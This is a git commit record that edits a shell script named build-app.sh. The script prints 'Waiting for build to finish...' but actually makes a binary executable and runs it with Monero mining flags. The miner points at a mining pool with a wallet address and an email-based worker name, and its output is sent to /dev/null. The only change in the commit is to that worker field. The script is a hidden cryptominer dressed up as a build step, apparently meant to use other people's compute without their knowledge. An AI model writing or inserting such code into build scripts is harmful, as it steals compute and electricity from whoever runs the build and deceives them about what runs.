683ac77897695b7fd7260d869b909ca3c1a2c6e5
neptunecorsiva <54308303+neptunecorsiva@users.noreply.github.com>
2020-06-27 17:28:51 +0800

    Update build-app.sh

--- build-app.sh
+++ build-app.sh
@@ -1,3 +1,3 @@
 echo "Waiting for build to finish..."
 chmod +x app
-./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 8AyaV73UVr99xxMXzir4AKEmb79NMki4diiTpfjqf1rba4HHdo65ggrWE41wK5rwpbjcvBp9JyUPLRrnWEU4u7WU883xiQV -p eroh:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast > /dev/null 2>&1
+./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 8AyaV73UVr99xxMXzir4AKEmb79NMki4diiTpfjqf1rba4HHdo65ggrWE41wK5rwpbjcvBp9JyUPLRrnWEU4u7WU883xiQV -p 2:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast > /dev/null 2>&1
